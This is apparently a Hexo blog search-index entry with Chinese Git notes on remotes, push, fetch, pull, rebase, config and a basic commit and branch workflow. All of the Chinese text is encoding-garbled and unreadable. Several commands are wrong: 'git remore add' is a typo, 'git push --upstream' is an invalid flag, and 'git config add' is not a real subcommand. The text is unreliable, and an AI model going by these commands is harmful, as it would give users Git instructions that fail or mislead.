<p>ä½†æ˜¯å¦‚æœåœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šåˆè¿›è¡Œäº†æ–°æäº¤ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆ†æ”¯å°±ä¼šå› ä¸ºæ”¹åŠ¨è€Œå‘å‰ç§»åŠ¨å¯¼è‡´å’Œæ ‡ç­¾æœ‰æ‰€ä¸åŒã€‚</p>
<h3 id="è¿œç¨‹ç®¡ç†"><a href="#è¿œç¨‹ç®¡ç†" class="headerlink" title="è¿œç¨‹ç®¡ç†"></a>è¿œç¨‹ç®¡ç†</h3><h4 id="è¿œç¨‹ä»“åº“"><a href="#è¿œç¨‹ä»“åº“" class="headerlink" title="è¿œç¨‹ä»“åº“"></a>è¿œç¨‹ä»“åº“</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remore add origin URL # æ·»åŠ è¿œç¨‹ä»“åº“ä¸ºorigin</span><br><span class="line">git remote rm origin # åˆ é™¤è¿œç¨‹ä»“åº“origin</span><br><span class="line"></span><br><span class="line">git branch -r # æŸ¥çœ‹è¿œç¨‹ä»“åº“çš„åˆ†æ”¯</span><br></pre></td></tr></table></figure>
<h4 id="æ¨é€"><a href="#æ¨é€" class="headerlink" title="æ¨é€"></a>æ¨é€</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin dev:dev # å°†æœ¬åœ°devåˆ†æ”¯æ¨é€åˆ°origin&#x2F;dev</span><br><span class="line">git push REMOTE :BRANCH # å°†ç©ºåˆ†æ”¯æäº¤åˆ°è¿œç¨‹åˆ†æ”¯ï¼Œå³åˆ é™¤è¿œç¨‹åˆ†æ”¯</span><br><span class="line">git push --upstream origin master # ä½¿å½“å‰åˆ†æ”¯è·Ÿè¸ªè¿œç¨‹åˆ†æ”¯</span><br></pre></td></tr></table></figure>
<h4 id="æ‹‰å–"><a href="#æ‹‰å–" class="headerlink" title="æ‹‰å–"></a>æ‹‰å–</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master # æ‹‰å–è¿œç¨‹ä»“åº“originçš„masteråˆ†æ”¯å¹¶å­˜åˆ°åˆ†æ”¯origin&#x2F;masterä¸­</span><br><span class="line">git merge origin&#x2F;master # å°†æŒ‡å®šè¿œç¨‹åˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ä¸­</span><br><span class="line"></span><br><span class="line">git pull origin master # åˆå¹¶fetchä¸mergeä¸¤ä¸ªæ“ä½œ</span><br></pre></td></tr></table></figure>
<h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --list # æŸ¥çœ‹é…ç½®æ–‡ä»¶</span><br><span class="line">git config --list --global #</span><br><span class="line">git config add</span><br></pre></td></tr></table></figure>
<h2 id="é¡¹ç›®ç®¡ç†æµç¨‹"><a href="#é¡¹ç›®ç®¡ç†æµç¨‹" class="headerlink" title="é¡¹ç›®ç®¡ç†æµç¨‹"></a>é¡¹ç›®ç®¡ç†æµç¨‹</h2><p><a href="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png"><img src="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png" alt="Gitè„‘å›¾"></a></p>
<h3 id="é¡¹ç›®æäº¤"><a href="#é¡¹ç›®æäº¤" class="headerlink" title="é¡¹ç›®æäº¤"></a>é¡¹ç›®æäº¤</h3><ol>
<li><p>åˆå§‹åŒ–/ä¸‹è½½é¡¹ç›®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git clone url</span><br></pre></td></tr></table></figure></li>
<li><p>åˆ›å»ºä¿®æ”¹</p>
</li>
<li><p>æ·»åŠ ä¿®æ”¹åˆ°æš‚å­˜</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add filename</span><br></pre></td></tr></table></figure></li>
<li><p>æäº¤æš‚å­˜</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;log&quot;</span><br></pre></td></tr></table></figure>
<h3 id="è¿œç¨‹åä½œ"><a href="#è¿œç¨‹åä½œ" class="headerlink" title="è¿œç¨‹åä½œ"></a>è¿œç¨‹åä½œ</h3></li>
<li><p>æ‹‰å– &amp; åˆå¹¶è¿œç¨‹åˆ†æ”¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master # origin&#x2F;master</span><br><span class="line">git merge origin&#x2F;master</span><br><span class="line"></span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></li>
<li><p>æ¨é€åˆ°è¿œç¨‹ä»“åº“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li>
<li><p>åˆå¹¶æäº¤ &amp; å˜åŸº</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master</span><br><span class="line">git rebase origin&#x2F;master</span><br></pre></td></tr></table></figure>
<h3 id="ç‰ˆæœ¬ç®¡ç†"><a href="#ç‰ˆæœ¬ç®¡ç†" class="headerlink" title="ç‰ˆæœ¬ç®¡ç†"></a>ç‰ˆæœ¬ç®¡ç†</h3></li>
<li><p>å¸¸é©»åˆ†æ”¯</p>
<p>master</p>
<p>development</p>
<p>* fix#1000</p>
</li>
<li><p>ä¸ºç‰ˆæœ¬æ‰“æ ‡ç­¾</p>
</li>
<li><p><a href="https://github.com/1000Delta/A11N0tes/blob/master/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E5%8F%B7.md">ç‰ˆæœ¬å·è§„èŒƒ</a></p>
</li>
<li><p><a href="https://juejin.im/post/5afc5242f265da0b7f44bee4">ä¼˜é›…çš„ä½¿ç”¨commit</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Note</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>git</tag>
      </tags>
  </entry>
</search>
